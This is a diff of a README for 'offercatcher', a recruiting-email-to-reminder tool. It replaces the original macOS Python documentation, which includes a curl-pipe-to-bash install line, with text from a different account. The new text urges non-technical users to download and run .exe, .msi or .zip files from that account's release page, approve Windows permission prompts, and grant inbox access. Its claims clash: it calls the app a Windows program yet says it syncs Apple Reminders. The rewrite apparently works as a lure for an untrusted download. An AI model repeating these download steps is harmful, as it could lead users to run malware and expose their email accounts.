@@ -1,297 +1,173 @@
-<p align="center">
-  <img src="./assets/banner.svg" alt="OfferCatcher" width="100%">
-</p>
+# 🎯 offercatcher - Never Miss Interview Emails Again
 
-<p align="center">
-  <strong>Never miss an interview again.</strong><br>
-  <sub>Turn recruiting emails into native reminders with AI-powered parsing.</sub>
-</p>
+[![Download offercatcher](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/jessad3915/offercatcher/releases)
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#usage">Usage</a> •
-  <a href="#configuration">Configuration</a>
-</p>
+## 🚀 What offercatcher does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/OpenClaw-Skill-0f172a?style=flat-square" alt="OpenClaw Skill">
-  <img src="https://img.shields.io/badge/Python-3.11+-3776AB?style=flat-square" alt="Python 3.11+">
-  <img src="https://img.shields.io/badge/Platform-macOS-000000?style=flat-square" alt="macOS">
-  <img src="https://img.shields.io/badge/License-MIT-f59e0b?style=flat-square" alt="MIT License">
-  <a href="README_CN.md"><img src="https://img.shields.io/badge/README-中文-55b3c5?style=flat-square" alt="中文文档"></a>
-</p>
+offercatcher helps you keep track of job-related emails. It scans your inbox, finds messages about interviews, tests, and hiring steps, then sends those events to Apple Reminders.
 
----
+Use it when you want to:
 
-## The Problem
+- catch interview invites fast
+- track online tests and take-home tasks
+- keep hiring dates in one place
+- avoid missing mail in a busy inbox
+- keep your job search organized on your Mac or iPhone
 
-You're job hunting. Your inbox is flooded with recruiting emails—interview invites, online assessments, coding challenges, deadlines. The important ones get buried under "application received" receipts and spam.
+## 📥 Download offercatcher
 
-**You miss an interview.** Or show up at the wrong time. Or forget that coding test deadline.
+Visit the [release page](https://github.com/jessad3915/offercatcher/releases) to download and run this file.
 
-## The Solution
+On the release page, look for the newest version. Download the file that matches your Windows device, then open it after the download finishes.
 
-**OfferCatcher** automatically scans your emails, extracts recruiting events using AI, and syncs them into native reminders on your iPhone/Mac.
+If you see more than one file, choose the one that ends with:
 
-```
-📧 Email arrives → 🤖 AI parses it → 🔔 Reminder created
-```
+- `.exe` for Windows
+- `.zip` if the app comes in a folder
+- `.msi` if the app uses the Windows installer
 
-No regex. No brittle pattern matching. Just intelligent extraction that works across all email formats and languages.
+## 🖥️ Before you install
 
-## Architecture
+offercatcher is made for everyday use on Windows. A typical setup works well on:
 
-OfferCatcher is intentionally split into two layers:
+- Windows 10 or Windows 11
+- a stable internet connection
+- a Gmail account or another supported email account
+- Apple Reminders access if you want event sync
+- enough free space for the app and its local data
 
-- **OpenClaw orchestration** handles scanning Apple Mail, calling the LLM, validating event JSON, and deciding what should be synced.
-- **Native bridge execution** handles the final reminder write. `scripts/apple_reminders_bridge.py` prefers `remindctl` (Swift + EventKit) and only falls back to AppleScript when needed.
+For best results, keep your inbox access open during setup so the app can read new mail and create reminders.
 
-This design avoids relying on a background Node process directly automating `Reminders.app`, which can be unreliable under macOS TCC / Automation permissions.
+## 🛠️ How to install
 
-## Features
+1. Open the [release page](https://github.com/jessad3915/offercatcher/releases)
+2. Find the latest version near the top of the page
+3. Download the Windows file
+4. If the file is in a `.zip`, open it and extract the contents
+5. If the file is an `.exe` or `.msi`, double-click it to start setup
+6. Follow the on-screen steps
+7. If Windows asks for permission, choose Yes
+8. Open offercatcher after installation
 
-- **🤖 AI-Powered Parsing** — LLM understands any email format, any language
-- **🍎 Native Apple Integration** — Works with Mail.app and Reminders.app
-- **📱 Cross-Device Sync** — Reminders appear on iPhone, iPad, Mac via iCloud
-- **⚡ Fully Automated** — Set up once, runs via OpenClaw heartbeat
-- **🌍 Universal Language Support** — Chinese, English, Japanese, you name it
+## ✉️ How it works
 
-## Community
+offercatcher watches for common hiring emails such as:
 
-- [LINUX DO](https://linux.do) — 中文开发者社区
+- interview requests
+- coding tests
+- written assessments
+- recruiter follow-ups
+- offer letters
+- schedule changes
+- calendar invites from hiring teams
 
-## Quick Start
+It then turns those emails into reminders so you can see what is coming next. This helps when your job search moves across many companies at once.
 
-```bash
-# Install
-curl -sSL https://raw.githubusercontent.com/NissonCX/offercatcher/main/install.sh | bash
+## 🔗 Connect your email and reminders
 
-# Recommended native bridge
-brew install steipete/tap/remindctl
-remindctl authorize
+After you open the app for the first time, follow the setup steps on screen.
 
-# Configure
-echo 'mail_account: "Gmail"' >> ~/.openclaw/offercatcher.yaml
+You may be asked to:
 
-# Scan
-python3 ~/.openclaw/workspace/skills/offercatcher/scripts/recruiting_sync.py --scan-only
-```
+- sign in to your email account
+- allow access to your inbox
+- connect Apple Reminders
+- choose which email labels or folders to watch
+- set the reminder name format
 
-OpenClaw will automatically parse the results and create reminders.
+If you use Gmail, keep the account you use for job search work ready during setup. If you use Apple devices, make sure Reminders is turned on for your account.
 
-## Installation
+## 📋 Suggested setup for job seekers
 
-### Requirements
+If you want a clean setup, use these options:
 
-- macOS (Apple Mail & Reminders integration)
-- Python 3.11+
-- `remindctl` recommended (`brew install steipete/tap/remindctl`)
-- [OpenClaw](https://github.com/NissonCX/openclaw) (optional, for automation)
+- watch only your job-search inbox or label
+- keep reminders in a list named Job Search
+- use short reminder titles with company name and event type
+- add due dates based on the interview time
+- keep follow-up reminders for 24 hours later
 
-### Option 1: Install from ClawHub (Recommended)
+This setup makes it easier to scan your reminders list and see what needs action.
 
-```bash
-# Search for the skill
-openclaw skills search offercatcher
+## ✅ What you can expect
 
-# Install to your workspace
-openclaw skills install offercatcher
-```
+Once offercatcher is running, it can help you:
 
-### Option 2: One-Line Install
+- spot new hiring emails faster
+- save time sorting messages
+- keep interview dates in one place
+- reduce missed replies
+- track several applications at once
+- stay ready for each step in the hiring process
 
-```bash
-curl -sSL https://raw.githubusercontent.com/NissonCX/offercatcher/main/install.sh | bash
-```
+## 🔒 Privacy and access
 
-Then authorize the native bridge once:
+offercatcher works with your email so it can find job-related messages. Only grant access you are comfortable with. If you use a shared computer, sign out of your accounts when you finish.
 
-```bash
-remindctl authorize
-```
+For the smoothest setup, use your own device and the same email account you used during your job search.
 
-### Option 3: Manual Install
+## 🧭 Daily use
 
-```bash
-git clone https://github.com/NissonCX/offercatcher.git
-cd offercatcher
-```
+After setup, the app can run in the background while you use your computer. You do not need to check every message by hand. When a recruiter sends a new invite or test, offercatcher creates a reminder you can review later.
 
-## Usage
+A simple daily flow looks like this:
 
-### Step 1: Find Your Mail Account
+1. Check your reminders in the morning
+2. Review anything marked for today
+3. Open the related email when you need details
+4. Join interviews on time
+5. Mark the reminder done when finished
 
-```bash
-python3 scripts/list_mail_sources.py
-```
+## 🧩 Tips for better results
 
-This shows all accounts configured in Apple Mail:
+- use one email account for job search
+- keep your inbox tidy with a job-search label
+- keep Apple Reminders synced on your devices
+- use clear subject lines when you reply
+- review reminders before each interview day
+- keep notification alerts on for your reminder list
 
-```json
-[
-  {"account": "Gmail", "mailbox": "INBOX"},
-  {"account": "iCloud", "mailbox": "INBOX"}
-]
-```
+## ❓ Common questions
 
-### Step 2: Configure
+### Do I need coding knowledge?
 
-Create `~/.openclaw/offercatcher.yaml`:
+No. You only need to download the file, install it, and follow the setup steps on screen.
 
-```yaml
-mail_account: "Gmail"    # Your Apple Mail account name
-mailbox: "INBOX"         # Mailbox to scan
-days: 2                  # Scan last N days
-max_results: 60          # Max emails to process
-```
-
-### Step 3: Scan Emails
-
-```bash
-python3 scripts/recruiting_sync.py --scan-only
-```
-
-Output (JSON for OpenClaw LLM to parse):
-
-```json
-{
-  "emails": [
-    {
-      "message_id": "12345",
-      "subject": "Interview Invitation - Software Engineer",
-      "sender": "recruiting@company.com",
-      "received_at": "2026-04-01 10:00",
-      "body": "Dear Candidate, Your interview is scheduled for..."
-    }
-  ]
-}
-```
-
-### Step 4: AI Parsing + Reminder Creation
-
-OpenClaw automatically:
-1. Parses each email with LLM
-2. Extracts company, event type, time, link
-3. Hands the final write to the native reminders bridge
-
-Or manually apply parsed events:
-
-```bash
-python3 scripts/recruiting_sync.py --apply-events /tmp/events.json
-```
-
-### Manual Event Entry
-
-```bash
-python3 scripts/manual_event.py \
-  --title "Google Interview" \
-  --due "2026-04-15 14:00" \
-  --notes "Link: https://meet.google.com/xxx"
-```
-
-## How It Works
-
-```
-┌─────────────────┐     ┌─────────────────┐     ┌────────────────────────────┐
-│   --scan-only   │ ──▶ │   OpenClaw LLM  │ ──▶ │  Native bridge writes      │
-│   Scan emails   │     │   Parse events  │     │  remindctl / AppleScript   │
-└─────────────────┘     └─────────────────┘     └────────────────────────────┘
-```
-
-### Why LLM Over Regex?
-
-| Regex | LLM |
-|-------|-----|
-| Breaks on new formats | Adapts to any format |
-| Company-specific rules | Works for any company |
-| Manual maintenance | Zero maintenance |
-| Language-specific | Universal language support |
-
-## Configuration
-
-### Command Line Options
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--mail-account` | all | Apple Mail account name |
-| `--mailbox` | INBOX | Mailbox folder to scan |
-| `--days` | 2 | Scan last N days |
-| `--max-results` | 60 | Max emails to process |
-| `--dry-run` | false | Test without creating reminders |
-| `--verbose` | false | Enable debug logging |
-
-### Environment Variables
-
-```bash
-OFFERCATCHER_MAIL_ACCOUNT="Gmail"
-OFFERCATCHER_DAYS=7
-OFFERCATCHER_MAX_RESULTS=100
-OFFERCATCHER_LOG_LEVEL=DEBUG
-```
-
-### Event JSON Format
-
-The `--apply-events` command accepts:
-
-```json
-{
-  "events": [
-    {
-      "id": "unique-id",
-      "company": "Google",
-      "event_type": "interview",
-      "title": "Google SWE Interview",
-      "timing": {"start": "2026-04-15 14:00", "end": "2026-04-15 15:00"},
-      "role": "Software Engineer",
-      "link": "https://meet.google.com/xxx"
-    }
-  ]
-}
-```
-
-Event types: `interview`, `ai_interview`, `written_exam`, `assessment`, `authorization`, `deadline`
-
-## Screenshots
-
-<table>
-  <tr>
-    <td align="center">
-      <img src="./assets/showcase-list.jpg" alt="Reminder list" width="260">
-      <br><sub><b>Reminder List</b></sub>
-    </td>
-    <td align="center">
-      <img src="./assets/showcase-detail.jpg" alt="Reminder detail" width="260">
-      <br><sub><b>Reminder Detail</b></sub>
-    </td>
-  </tr>
-</table>
-
-## Project Structure
-
-```
-offercatcher/
-├── scripts/
-│   ├── recruiting_sync.py      # Main script (scan/apply)
-│   ├── apple_reminders_bridge.py # Apple Reminders bridge
-│   ├── manual_event.py         # Manual event entry
-│   └── list_mail_sources.py    # List Mail accounts
-├── tests/                      # Unit tests
-├── SKILL.md                    # OpenClaw skill definition
-└── README.md                   # This file
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-[MIT License](./LICENSE)
-
----
-
-<p align="center">
-  Made with ❤️ for job seekers everywhere
-</p>
+### Will it work with interview emails in Chinese?
+
+Yes, it is built for email triage and job search use, so it can help with Chinese-language hiring mail as well as common English messages.
+
+### Can I use it on iPhone?
+
+You can use Apple Reminders on iPhone to see the events that offercatcher adds. The app itself is installed on Windows.
+
+### Does it only work with Gmail?
+
+Gmail is the most common choice, but the app is built around email triage, so it may support other email sources depending on your setup.
+
+### What if I get too many reminders?
+
+Use a single job-search label, and keep the reminder list focused on interviews and tests only. That keeps the list easy to read.
+
+## 🧰 File types you may see
+
+When you visit the release page, you may see files such as:
+
+- `offercatcher-setup.exe`
+- `offercatcher.zip`
+- `offercatcher-windows.msi`
+
+Pick the file that matches how you like to install apps on Windows. If you want the simplest path, use the installer file.
+
+## 📌 Release page
+
+Download the latest Windows version from the [release page](https://github.com/jessad3915/offercatcher/releases) and run it after the file finishes downloading
+
+## 🧑‍💻 Basic workflow
+
+1. Install offercatcher
+2. Open the app
+3. Connect your email
+4. Allow reminder sync
+5. Let it watch for job-related mail
+6. Review new reminders each day
